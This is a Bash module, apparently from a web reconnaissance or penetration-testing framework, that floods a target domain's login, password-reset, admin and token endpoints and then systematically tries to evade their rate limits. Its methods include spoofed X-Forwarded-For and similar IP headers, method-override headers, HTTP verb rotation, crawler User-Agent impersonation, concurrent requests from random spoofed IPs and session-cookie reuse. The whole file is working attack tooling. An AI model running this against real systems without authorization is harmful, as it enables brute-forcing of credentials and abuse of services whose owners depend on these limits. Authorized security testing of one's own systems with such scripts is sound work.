#!/usr/bin/env bash
# rate_limit_bypass_phase.sh - Rate-limit bypass systematic testing,
# IP rotation, header manipulation, distributed bypass vectors.

rate_limit_bypass_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "rate_limit_bypass_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/rate_limit_bypass"

    local results=0
    local bypass_file="$output_dir/rate_limit_bypass/rate_limit_bypass.txt"
    local methods_file="$output_dir/rate_limit_bypass/bypass_methods.txt"

    log "INFO" "Starting rate-limit bypass testing for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # Sensitive endpoints to test bypass against
    local endpoints=(
        "/api/login"
        "/api/register"
        "/api/password/reset"
        "/api/search"
        "/api/data/export"
        "/api/admin"
        "/api/upload"
        "/api/verify"
        "/graphql"
        "/api/token"
    )

    local rl_test_url="https://${domain}/api/login"
    local concurrent_count=20

    # Phase 1: Identify rate-limited endpoints
    log "INFO" "Phase 1: Identifying rate-limited endpoints"
    local rate_limited=()

    for endpoint in "${endpoints[@]}"; do
        local url="https://${domain}${endpoint}"
        local triggered_429=false

        for i in $(seq 1 25); do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -X POST -d "test=1" "$url" 2>/dev/null || echo "000")
            if [[ "$status" == "429" ]]; then
                triggered_429=true
                break
            fi
        done

        if $triggered_429; then
            rate_limited+=("$endpoint")
            log "INFO" "Rate limit detected on $endpoint"
        fi
    done

    if [[ ${#rate_limited[@]} -eq 0 ]]; then
        echo "[NO-RATE-LIMITS] No rate limiting detected on any tested endpoint" >> "$bypass_file"
        ((results++)) || true
    fi

    # Phase 2: IP rotation bypass via header injection
    log "INFO" "Phase 2: Testing IP rotation bypass"

    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"
        echo "[METHOD] Header-based IP rotation" >> "$methods_file"

        local spoof_headers=(
            "X-Forwarded-For: 127.0.0.$((RANDOM % 255))"
            "X-Real-IP: 10.$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
            "X-Originating-IP: 192.168.$((RANDOM % 255)).$((RANDOM % 255))"
            "X-Client-IP: 172.$(( 16 + RANDOM % 16 )).$((RANDOM % 256)).$((RANDOM % 256))"
            "Forwarded: for=127.0.0.$((RANDOM % 255));by=proxy"
            "X-ProxyUser-IP: 10.0.$((RANDOM % 255)).$((RANDOM % 255))"
            "X-True-Client-IP: $((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
            "X-Forwarded-For: 127.0.0.$((RANDOM % 255)), 10.0.0.1"
            "X-Forwarded-For: ::1, 127.0.0.1"
        )

        for hdr in "${spoof_headers[@]}"; do
            # First trigger rate limit
            for i in $(seq 1 25); do
                curl -s -o /dev/null -m 5 -X POST -d "test=1" "$url" 2>/dev/null || true
            done

            # Try bypass
            local bypass_status
            bypass_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -X POST -d "test=1" -H "$hdr" "$url" 2>/dev/null || echo "000")
            if [[ "$bypass_status" != "429" && "$bypass_status" != "000" ]]; then
                echo "[BYPASS] IP rotation via $hdr on $endpoint -> HTTP $bypass_status" >> "$bypass_file"
                ((results++)) || true
            fi
        done
    done

    # Phase 3: Header manipulation bypass
    log "INFO" "Phase 3: Header manipulation bypass"

    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"
        echo "[METHOD] Header manipulation" >> "$methods_file"

        local manipulation_headers=(
            "X-HTTP-Method-Override: GET"
            "X-HTTP-Method: GET"
            "X-Method-Override: GET"
            "_method: GET"
            "X-Request-ID: $(head -c 16 /dev/urandom | xxd -p 2>/dev/null || echo "$(date +%s%N)")"
            "X-Correlation-ID: $(date +%s)-$((RANDOM))"
            "Accept-Encoding: gzip, deflate, br"
            "Connection: keep-alive"
            "Cache-Control: no-cache"
            "Pragma: no-cache"
        )

        for hdr in "${manipulation_headers[@]}"; do
            for i in $(seq 1 25); do
                curl -s -o /dev/null -m 5 -X POST -d "test=1" "$url" 2>/dev/null || true
            done

            local hdr_status
            hdr_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -X POST -d "test=1" -H "$hdr" "$url" 2>/dev/null || echo "000")
            if [[ "$hdr_status" != "429" && "$hdr_status" != "000" ]]; then
                echo "[BYPASS] Header manipulation $hdr on $endpoint -> HTTP $hdr_status" >> "$bypass_file"
                ((results++)) || true
            fi
        done
    done

    # Phase 4: HTTP method variation bypass
    log "INFO" "Phase 4: HTTP method variation bypass"
    echo "[METHOD] HTTP method rotation" >> "$methods_file"

    local methods=("GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD" "TRACE")

    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"

        for i in $(seq 1 25); do
            curl -s -o /dev/null -m 5 -X POST -d "test=1" "$url" 2>/dev/null || true
        done

        for method in "${methods[@]}"; do
            local method_status
            method_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -X "$method" "$url" 2>/dev/null || echo "000")
            if [[ "$method_status" != "429" && "$method_status" != "000" ]]; then
                echo "[BYPASS] Method $method on $endpoint -> HTTP $method_status" >> "$bypass_file"
                ((results++)) || true
            fi
        done
    done

    # Phase 5: Distributed bypass via concurrent requests
    log "INFO" "Phase 5: Distributed concurrent bypass"
    echo "[METHOD] Distributed concurrent requests" >> "$methods_file"

    local temp_dir
    temp_dir=$(mktemp -d)

    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"

        # Trigger rate limit
        for i in $(seq 1 25); do
            curl -s -o /dev/null -m 5 -X POST -d "test=1" "$url" 2>/dev/null || true
        done

        # Launch concurrent bypass attempts
        local dist_pids=()
        for i in $(seq 1 "$concurrent_count"); do
            local random_ip
            random_ip="$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
            curl -s -o /dev/null -w "%{http_code}\n" -m 5 \
                -X POST -d "test=1" \
                -H "X-Forwarded-For: $random_ip" \
                "$url" > "$temp_dir/dist_${i}.txt" 2>/dev/null &
            dist_pids+=($!)
        done

        for pid in "${dist_pids[@]}"; do
            wait "$pid" 2>/dev/null || true
        done

        local dist_success=0
        for i in $(seq 1 "$concurrent_count"); do
            local code
            code=$(cat "$temp_dir/dist_${i}.txt" 2>/dev/null || true)
            if [[ "$code" == "200" || "$code" == "201" || "$code" == "401" ]]; then
                ((dist_success++)) || true
            fi
        done

        if [[ "$dist_success" -gt 0 ]]; then
            echo "[BYPASS] Distributed bypass on $endpoint - $dist_success/$concurrent_count requests succeeded" >> "$bypass_file"
            ((results++)) || true
        fi
    done

    # Phase 6: User-Agent rotation bypass
    log "INFO" "Phase 6: User-Agent rotation bypass"
    echo "[METHOD] User-Agent rotation" >> "$methods_file"

    local agents=(
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "curl/7.68.0"
        "Wget/1.20.3"
        "python-requests/2.25.1"
        "Go-http-client/1.1"
    )

    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"

        for i in $(seq 1 25); do
            curl -s -o /dev/null -m 5 -X POST -d "test=1" "$url" 2>/dev/null || true
        done

        for agent in "${agents[@]}"; do
            local ua_status
            ua_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -H "User-Agent: $agent" -X POST -d "test=1" "$url" 2>/dev/null || echo "000")
            if [[ "$ua_status" != "429" && "$ua_status" != "000" ]]; then
                echo "[BYPASS] UA rotation ($agent) on $endpoint -> HTTP $ua_status" >> "$bypass_file"
                ((results++)) || true
            fi
        done
    done

    # Phase 7: Cookie/session-based bypass
    log "INFO" "Phase 7: Cookie/session-based bypass"
    echo "[METHOD] Session-based bypass" >> "$methods_file"

    local cookie_jar
    cookie_jar=$(mktemp)
    for endpoint in "${rate_limited[@]}"; do
        local url="https://${domain}${endpoint}"
        curl -s -c "$cookie_jar" -m 5 "$url" 2>/dev/null || true

        for i in $(seq 1 25); do
            curl -s -o /dev/null -m 5 -b "$cookie_jar" -X POST -d "test=1" "$url" 2>/dev/null || true
        done

        local cookie_status
        cookie_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
            -b "$cookie_jar" -X POST -d "test=1" "$url" 2>/dev/null || echo "000")
        if [[ "$cookie_status" != "429" && "$cookie_status" != "000" ]]; then
            echo "[BYPASS] Cookie-based bypass on $endpoint -> HTTP $cookie_status" >> "$bypass_file"
            ((results++)) || true
        fi
    done
    rm -f "$cookie_jar" 2>/dev/null || true

    # Cleanup
    rm -rf "$temp_dir" 2>/dev/null || true

    # Write count
    echo "$results" > "$output_dir/rate_limit_bypass/count.txt"

    # Write structured findings via phase_bridge
    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "rate_limit_bypass" "HIGH" "$line" 2>/dev/null || true
        done < "$bypass_file" 2>/dev/null || true
        while IFS= read -r line; do
            write_asset "rate_limit_bypass" "bypass_method" "$line" 2>/dev/null || true
        done < "$methods_file" 2>/dev/null || true
    fi

    py_log "INFO" "rate_limit_bypass_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Rate-limit bypass phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    rate_limit_bypass_phase "$@"
fi
